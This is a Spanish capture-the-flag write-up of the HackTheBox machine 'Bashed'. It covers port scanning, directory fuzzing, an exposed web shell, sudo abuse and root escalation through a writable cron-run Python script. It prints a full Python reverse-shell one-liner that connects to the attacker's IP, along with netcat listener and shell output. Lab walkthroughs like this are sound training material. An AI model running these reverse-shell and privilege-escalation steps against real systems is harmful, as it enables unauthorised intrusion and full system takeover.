---
layout: default
title: Bashed
---
# ENUMERACIÓN

Confirmamos con el comando ping si tenemos conexión con la máquina, mandando a esta peticiones ICMP echo.

```bash
$ ping -c 1 10.129.58.114
PING 10.129.58.114 (10.129.58.114) 56(84) bytes of data.
64 bytes from 10.129.58.114: icmp_seq=1 ttl=63 time=7.72 ms

--- 10.129.58.114 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.716/7.716/7.716/0.000 ms
```

Vemos que recibimos un paquete, lo que significa que sí tenemos conexión con la máquina, procedemos a buscar puertos que tiene abiertos:

```bash
$ nmap 10.129.58.114
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 11:29 CDT
Nmap scan report for 10.129.58.114
Host is up (0.011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

Vemos que tiene el puerto 80 (http) abierto, vamos a tratar de sacar la versión con un segundo escaneo exclusivamente a ese puerto:

```bash
$ nmap -sCV -p80 10.129.58.114
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 11:30 CDT
Nmap scan report for 10.129.58.114
Host is up (0.0084s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

Vemos gracias al título de la web que parece ser un sitio en desarrollo por el usuario **Arrexel**, vamos a echar un vistazo a la web:

![bashed]({{ "/assets/images/bashed1.png"}})

Si pulsamos en la flecha nos redirige a una página con capturas de pantalla y demuestra y avisa que ha probado su herramienta en la web, la cual es una web shell semi-interactiva:

![bashed]({{ "/assets/images/bashed2.png"}})

Según las capturas lo encontraríamos en el directorio **uploads**, no obstante, ahí no encontramos el web shell, entonces, vamos a hacer fuzzing de directorios con herramientas como **fuff**:

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.58.114/FUZZ

uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 7ms]
php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 7ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 7ms]
dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 7ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 8ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 804ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 7ms]
```
Vemos que encontramos el directorio dev, entre otros, al cual si navegamos encontramos lo siguiente:

![bashed]({{ "/assets/images/bashed3.png"}})

Si nos metemos a alguno de ambos, vemos que tenemos la shell semi interactiva que śe testeó en el servidor:

![bashed]({{ "/assets/images/bashed4.png"}})

Vamos a mandarnos una reverse shell con Python, el cual está instalado en el servidor, así podemos conseguir una shell más interactiva
, tenemos antes que iniciar un oyente en nuestra máquina atacante:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

Tras eso ejecutamos la reverse shell en la web shell semi-interactiva que encontramos en el servidor:

![bashed]({{ "/assets/images/bashed5.png"}})

Y una vez ejecutado deberíamos tener la shell en nuestra máquina:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.210] from (UNKNOWN) [10.129.58.114] 50652
$ whoami
whoami
www-data
```

Efectivamente, tenemos la reverse shell, aunque la haremos más interactiva con los siguientes comandos:

```bash
$ stty raw -echo;fg
```

Esto lo ejecutamos en nuestra máquina atacante, tras eso, en el servidor ejecutamos los siguientes:

```bash
$ export TERM=xterm
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Ya deberíamos tener una shell interactiva.

Si listamos los directorios que existen en **/home** encontramos el de Arrexel y el de scriptmanager:

```bash
www-data@bashed:/var/www/html/dev$ ls /home
arrexel  scriptmanager
```

Si listamos el contenido de **/home/arrexel** encontramos la user flag, la cual podemos leer con los permisos que tenemos:

```bash
www-data@bashed:/var/www/html/dev$ cd /home/arrexel/
www-data@bashed:/home/arrexel$ ls
user.txt
www-data@bashed:/home/arrexel$ cat user.txt
```
## Escalada de privilegios

Ahora, buscaremos la forma de escalar privilegios, primero viendo nuestros permisos como sudo con **sudo -l**:

```bash
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Como podemos ver podemos ejecutar sin necesidad de contraseña cualquier cosa como el usuario **scriptmanager** o su grupo, por lo tanto vamos a suplantarle:

```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash
scriptmanager@bashed:/home/arrexel$ whoami
scriptmanager
```

Como podemos ver somos el usuario **scriptmanager**, ahora debemos intentar escalar a root.

En **/scripts**, que es un directorio creado por alguien, no es predeterminado del sistema, encontramos 2 ficheros:

```bash
scriptmanager@bashed:~$ ls -l /scripts/ 
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 244 Jun  4 09:23 test.py
-rw-r--r-- 1 root          root           21 Jun  4 09:16 test.txt
```

El de python tenemos capacidad de escritura, ya que somos el propietario, en el txt, solo de lectura, pero es del usuario root.

```bash
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
testing 123!scriptmanager@bashed:/scripts$
```

Como podemos ver, el script que tenemos permiso de escritura parece abrir y escribir en el archivo de texto, en el cual solo tiene permisos de escritura por el usuario root, y si modificamos el texto que queremos que se escriba en el script, se cambia en el fichero test.txt como al minuto mas o menos, podríamos ver cada cuanto se ejecuta con herramientas como **pspy**, no obstante, ya sabemos que es una cron que se ejecuta como root, así que modificamos el script para que nos envíe una reverse shell a un puerto que pondremos a escucha en nuestra máquina atacante.

El script modificado luce así:

```bash
scriptmanager@bashed:/scripts$ cat test.py
import os
os.system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.210",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'')
```

Nos envía una reverse shell al puerto 4444 que tendremos a escucha, si se ejecuta eventualmente como root como tenemos pensado, deberíamos de obtener la reverse shell como usuario root:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.210] from (UNKNOWN) [10.129.189.48] 37778
# whoami
whoami
root
# ls /root	
ls /root
root.txt
```

Efectivamente, recibimos la reverse shell como root y podemos ver la root flag en **/root**!

